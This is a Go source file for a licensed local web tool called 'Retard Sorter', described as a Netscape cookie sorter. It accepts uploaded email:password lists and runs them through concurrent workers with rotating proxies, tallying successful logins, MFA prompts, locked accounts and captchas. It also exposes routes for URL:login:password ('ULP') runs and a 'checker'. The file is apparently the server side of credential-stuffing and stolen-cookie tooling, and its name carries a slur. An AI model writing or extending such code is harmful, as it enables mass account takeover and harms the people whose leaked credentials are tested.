// convertSSEMu serializes writes to the conversion SSE stream. The engine
// emits from worker goroutines, and http.ResponseWriter is not safe for
// concurrent writes.
var convertSSEMu sync.Mutex

func writeConvertSSE(w http.ResponseWriter, flusher http.Flusher, ev ConvertEvent) {
	convertSSEMu.Lock()
	defer convertSSEMu.Unlock()
	defer func() { recover() }()
	fmt.Fprintf(w, "data: %s\n\n", mustJSON(ev))
	if flusher != nil {
		flusher.Flush()
	}
}

func handleConvertInput(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(64 << 20); err != nil {
		http.Error(w, "failed to parse upload: "+err.Error(), 400)
		return
	}
	fh, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "no file provided", 400)
		return
	}
	defer fh.Close()
	data, err := io.ReadAll(fh)
	if err != nil {
		http.Error(w, "failed to read file", 400)
		return
	}
	if err := os.WriteFile(converterInputPath, data, 0644); err != nil {
		http.Error(w, "failed to save file", 500)
		return
	}
	cfgMu.Lock()
	cfg.Converter.InputFile = converterInputPath
	saveConfig(cfg)
	cfgMu.Unlock()
	appLog("CONVERTER INPUT - saved %s (%d bytes)", filepath.Base(converterInputPath), len(data))
	writeJSON(w, map[string]interface{}{"status": "ok", "file": filepath.Base(converterInputPath), "bytes": len(data)})
}

func handleConvertRun(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			appLog("PANIC in handleConvertRun: %v", rec)
			writeConvertSSE(w, nil, ConvertEvent{Type: "error", Message: fmt.Sprintf("internal error: %v", rec)})
		}
	}()

	convertMu.Lock()
	if convertCancel != nil {
		convertMu.Unlock()
		writeConvertSSE(w, nil, ConvertEvent{Type: "error", Message: "a conversion run is already active; stop it first"})
		return
	}
	ctx, cancel := context.WithCancel(r.Context())
	convertCancel = cancel
	convertMu.Unlock()
	defer func() {
		convertMu.Lock()
		convertCancel = nil
		convertMu.Unlock()
	}()

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	flusher, _ := w.(http.Flusher)

	opts := converter.Options{}
	q := r.URL.Query()
	if q.Get("input") != "" {
		opts.InputPath = q.Get("input")
	} else {
		cfgMu.RLock()
		opts.InputPath = cfg.Converter.InputFile
		cfgMu.RUnlock()
		if opts.InputPath == "" {
			opts.InputPath = converterInputPath
		}
	}
	opts.DryRun = q.Get("dryrun") == "1"
	opts.Prefix = q.Get("prefix")
	if opts.Prefix == "" {
		cfgMu.RLock()
		opts.Prefix = cfg.Converter.Prefix
		cfgMu.RUnlock()
	}
	if opts.Prefix == "" {
		opts.Prefix = "retard"
	}
	if v := q.Get("concurrency"); v != "" {
		fmt.Sscanf(v, "%d", &opts.Concurrency)
	}
	if opts.Concurrency == 0 {
		cfgMu.RLock()
		opts.Concurrency = cfg.Converter.Concurrency
		cfgMu.RUnlock()
	}
	if opts.Concurrency == 0 {
		opts.Concurrency = 25
	}
	if opts.Concurrency > 50 {
		opts.Concurrency = 50
	}
	cfgMu.RLock()
	opts.BrowserPath = cfg.Converter.BrowserPath
	cfgMu.RUnlock()
	opts.Validate = q.Get("validate") != "false"
	opts.Retries = 2

	if opts.InputPath == "" || !fileExists(opts.InputPath) {
		writeConvertSSE(w, flusher, ConvertEvent{Type: "error", Message: "no input file; upload an email:password list first"})
		return
	}

	outBase := q.Get("outdir")
	if outBase == "" {
		cfgMu.RLock()
		outBase = cfg.Converter.OutputDir
		cfgMu.RUnlock()
	}
	if outBase == "" {
		outBase = resDir
	}
	outDir := filepath.Join(outBase, "convert_run_"+time.Now().Format("20060102_150405"))
	opts.OutputDir = outDir

	if !opts.DryRun && q.Get("proxyless") != "1" {
		proxyPath := ""
		cfgMu.RLock()
		proxyPath = cfg.ProxyFile
		cfgMu.RUnlock()
		if proxyPath == "" {
			proxyPath = proxiesPath
		}
		var proxyList []string
		if fileExists(proxyPath) {
			loadProxies(proxyPath)
			proxiesMu.Lock()
			proxyList = append([]string{}, proxies...)
			proxiesMu.Unlock()
		}
		var normalized []string
		for _, p := range proxyList {
			if strings.Contains(p, "://") {
				normalized = append(normalized, p)
				continue
			}
			if u := buildProxyURL(p, "http"); u != "" {
				normalized = append(normalized, u)
			}
		}
		opts.Proxies = normalized
	}

	appLog("CONVERTER RUN START - input: %s, dry: %v, workers: %d, proxies: %d, proxyless: %v, validate: %v, out: %s",
		opts.InputPath, opts.DryRun, opts.Concurrency, len(opts.Proxies), opts.Proxies == nil, opts.Validate, outDir)

	opts.OnStatus = func(msg string) {
		appLog("CONVERTER STATUS - %s", msg)
	}

	res, err := converter.Run(ctx, opts, func(p converter.Progress) {
		writeConvertSSE(w, flusher, ConvertEvent{
			Type:       "progress",
			Total:      p.Total,
			Processed:  p.Processed,
			Success:    p.Success,
			Failed:     p.Failed,
			MFA:        p.MFA,
			Invalid:    p.Invalid,
			Locked:     p.Locked,
			Captcha:    p.Captcha,
			Skipped:    p.Skipped,
			Current:    p.Current,
			RatePerMin: p.RatePerMin,
			ETA:        p.ETA,
		})
	})
	if err != nil {
		writeConvertSSE(w, flusher, ConvertEvent{Type: "error", Message: err.Error()})
		return
	}

	cfgMu.Lock()
	cfg.Converter.OutputDir = outBase
	cfg.Converter.Prefix = opts.Prefix
	cfg.Converter.Concurrency = opts.Concurrency
	saveConfig(cfg)
	cfgMu.Unlock()

	writeConvertSSE(w, flusher, ConvertEvent{
		Type:      "done",
		Total:     res.Total,
		Parsed:    res.Parsed,
		Duplicate: res.Duplicate,
		Unparsed:  res.Unparsed,
		Processed: res.Final.Processed,
		Success:   res.Final.Success,
		Failed:    res.Final.Failed,
		MFA:       res.Final.MFA,
		Invalid:   res.Final.Invalid,
		Locked:    res.Final.Locked,
		Captcha:   res.Final.Captcha,
		Skipped:   res.Final.Skipped,
		OutDir:    res.OutDir,
		CSVPath:   res.CSVPath,
		FailPath:  res.FailPath,
		DryRun:    res.DryRun,
	})
	appLog("CONVERTER RUN DONE - total: %d, processed: %d, success: %d, failed: %d", res.Total, res.Final.Processed, res.Final.Success, res.Final.Failed)
}

func handleConvertStop(w http.ResponseWriter, r *http.Request) {
	convertMu.Lock()
	defer convertMu.Unlock()
	if convertCancel == nil {
		writeJSON(w, map[string]interface{}{"status": "idle"})
		return
	}
	convertCancel()
	convertCancel = nil
	appLog("CONVERTER STOP - cancel requested")
	writeJSON(w, map[string]interface{}{"status": "stopping"})
}

// === USER HANDLER ===
var userMu sync.Mutex

type UserData struct {
	Name string `json:"name"`
}

func userFilePath() string {
	return filepath.Join(profilesDir, "user.json")
}

func loadUser() UserData {
	userMu.Lock()
	defer userMu.Unlock()
	data, err := os.ReadFile(userFilePath())
	if err == nil {
		var u UserData
		if json.Unmarshal(data, &u) == nil {
			return u
		}
	}
	return UserData{}
}

func saveUser(u UserData) {
	userMu.Lock()
	defer userMu.Unlock()
	data, _ := json.MarshalIndent(u, "", "  ")
	os.MkdirAll(profilesDir, 0755)
	os.WriteFile(userFilePath(), data, 0644)
}

func handleUser(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var req struct {
			Name string `json:"name"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		req.Name = strings.TrimSpace(req.Name)
		if req.Name == "" {
			http.Error(w, "name required", 400)
			return
		}
		saveUser(UserData{Name: req.Name})
		writeJSON(w, map[string]string{"status": "ok", "name": req.Name})
		return
	}
	u := loadUser()
	writeJSON(w, u)
}

// === HELPERS ===

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(v)
}

func writeSSE(w http.ResponseWriter, ev ProgressEvent) {
	defer func() { recover() }()
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	fmt.Fprintf(w, "data: %s\n\n", mustJSON(ev))
	if f, ok := w.(http.Flusher); ok {
		f.Flush()
	}
}

func mustJSON(v interface{}) string {
	data, _ := json.Marshal(v)
	return string(data)
}

func openBrowser(url string) {
	var cmd string
	var args []string
	switch runtime.GOOS {
	case "darwin":
		cmd = "open"
	case "linux":
		cmd = "xdg-open"
	default:
		cmd = "cmd"
		args = []string{"/c", "start"}
	}
	os.StartProcess(cmd, append(args, url), &os.ProcAttr{Files: []*os.File{nil, nil, nil}})
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			fatalLog("PANIC: %v", r)
			os.Exit(1)
		}
	}()

	// Owner-side helper: encrypt supabase.env into machine-bound supabase.env.enc.
	if len(os.Args) > 1 && os.Args[1] == "-encrypt-env" {
		exeDir := getExeDir()
		if err := auth.EncryptEnvFile(exeDir); err != nil {
			fmt.Fprintf(os.Stderr, "encrypt-env failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("OK: supabase.env encrypted into machine-bound %s; plaintext removed.\n", auth.EncryptedEnvFileName())
		os.Exit(0)
	}

	cfg = loadConfig()
	appLog("STARTUP - Retard Sorter v%s", Version)

	exeDir := getExeDir()

	// Load Supabase secrets into the environment: real env vars win,
	// then the machine-encrypted supabase.env.enc, then plaintext
	// supabase.env (see internal/auth/envfile.go). The supabase client
	// reads everything from the environment.
	auth.LoadEnvSecrets(exeDir)

	sb, err := supabase.New()
	if err != nil {
		fatalLog("FATAL: %v", err)
		fmt.Fprintf(os.Stderr, "Auth configuration error: %v\n\nSet SUPABASE_URL and SUPABASE_SERVICE_KEY (or provide supabase.env / supabase.env.enc next to the exe — see README.md).\n", err)
		os.Exit(1)
	}

	appTpl, err := template.ParseGlob("templates/*.gohtml")
	if err != nil {
		fatalLog("FATAL: template load failed: %v", err)
		os.Exit(1)
	}

	app := handlers.New(sb, appTpl)

	// License invalidation (revalidation verdict): kick the user back to
	// activation and interrupt any in-flight conversion work.
	var stopLicenseReval func()
	onLicenseInvalid := func(msg string) {
		appLog("AUTH - LICENSE INVALIDATED: %s", msg)
		auth.SetForcedActivationReason(msg)
		convertMu.Lock()
		if convertCancel != nil {
			convertCancel()
		}
		convertMu.Unlock()
	}

	// Start the revalidator if a valid cached session exists at launch.
	// It is also (re)triggered on every successful activation via
	// app.OnActivated — the single-start guard makes that safe.
	app.OnActivated = func() {
		if stopLicenseReval == nil {
			stopLicenseReval = auth.StartLicenseRevalidator(sb, onLicenseInvalid)
		}
	}
	if _, err := auth.LoadSession(); err == nil {
		appLog("AUTH - session restored")
		app.OnActivated()
	} else {
		appLog("AUTH - no session; activation required")
	}
	defer func() {
		if stopLicenseReval != nil {
			stopLicenseReval()
		}
	}()

	appLog("Profiles dir: %s", profilesDir)
	appLog("Log file: %s", logPath)

	sub, err := fs.Sub(staticFiles, "static")
	if err != nil {
		fatalLog("FATAL: static embed failed: %v", err)
		panic(err)
	}

	// Public route: license activation. Everything else requires an
	// activated session (RequireSession redirects to /activate, with the
	// invalidation reason appended when revalidation kicked the user out).
	muxPublic := http.NewServeMux()
	muxPublic.HandleFunc("/activate", app.HandleActivate)

	mux := http.NewServeMux()
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.FS(sub))))
	mux.Handle("/assets/", http.StripPrefix("/assets/",
		http.FileServer(http.Dir(assetsDir))))
	mux.HandleFunc("/api/changelog", handleChangelog)
	mux.HandleFunc("/api/config", handleConfig)
	mux.HandleFunc("/api/config/filters", handleUpdateFilters)
	mux.HandleFunc("/api/config/proxy", handleProxyConfig)
	mux.HandleFunc("/api/config/proxyfile", handleProxyUpload)
	mux.HandleFunc("/api/config/sortmode", handleSortMode)
	mux.HandleFunc("/api/config/outputdir", handleUpdateOutputDir)
	mux.HandleFunc("/api/convert/input", handleConvertInput)
	mux.HandleFunc("/api/convert/run", handleConvertRun)
	mux.HandleFunc("/api/convert/stop", handleConvertStop)
	mux.HandleFunc("/api/user", handleUser)
	mux.HandleFunc("/api/runs", handleRuns)
	mux.HandleFunc("/api/run/progress", handleRunProgress)
	mux.HandleFunc("/api/run/ulp", handleRunULP)
	mux.HandleFunc("/api/run/checker", handleRunChecker)
	mux.HandleFunc("/api/runs/", func(w http.ResponseWriter, r *http.Request) {
		path := strings.TrimPrefix(r.URL.Path, "/api/runs/")
		if path == "" {
			handleRuns(w, r)
			return
		}
		handleRunDetail(w, r, path)
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		data, _ := staticFiles.ReadFile("static/index.html")
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(data)
	})
	muxPublic.Handle("/", auth.RequireSession(mux))

	port := "9734"
	addr := "127.0.0.1:" + port
	fmt.Println("============================================================")
	fmt.Println("  RETARD SORTER v" + Version)
	fmt.Println("  Netscape Cookie Sorter & Domain Filter")
	fmt.Println("============================================================")
	fmt.Println()
	fmt.Printf("  Profiles dir: %s\n", profilesDir)
	fmt.Println()
	fmt.Printf("  Place your files in: %s\n", assetsDir)
	fmt.Println("    - background.mp4  (fullscreen video background)")
	fmt.Println("    - logo.gif        (sidebar logo, animated)")
	fmt.Println("    - logo.png        (fallback if logo.gif missing)")
	fmt.Println()
	fmt.Printf("  Server started at  http://%s\n", addr)
	fmt.Println("  Opening browser...")
	fmt.Println()
	fmt.Println("  Press Ctrl+C to stop the server.")
	fmt.Println()
	fmt.Printf("  Log: %s\n\n", logPath)

	go openBrowser("http://" + addr)

	if err := http.ListenAndServe(addr, muxPublic); err != nil {
		appLog("SERVER STOP - %v", err)
		fmt.Fprintf(os.Stderr, "Server error: %s\n", err)
		os.Exit(1)
	}
	if stopLicenseReval != nil {
		stopLicenseReval()
	}
	appLog("SHUTDOWN - Normal exit")
}
